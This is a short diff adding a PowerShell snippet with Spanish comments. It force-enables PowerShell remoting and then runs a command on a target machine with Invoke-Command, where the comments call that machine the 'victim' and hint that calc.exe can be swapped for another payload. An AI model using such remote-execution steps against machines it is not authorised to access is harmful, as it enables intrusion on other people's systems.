@@ -1,0 +1,8 @@
+# Primero ejecutar este comando, Fuerza la habilitación de conexión remota
+
+Enable-PSRemoting -Force
+
+# Luego este comando necesitas remplazar #"nombre_del_equipo" con el nombre del equipo victima y claro calc.exe si no quieres abrir solo una calculadora;)
+
+
+Invoke-Command -ComputerName nombre_del_equipo -ScriptBlock { calc.exe } -Credential (Get-Credential)
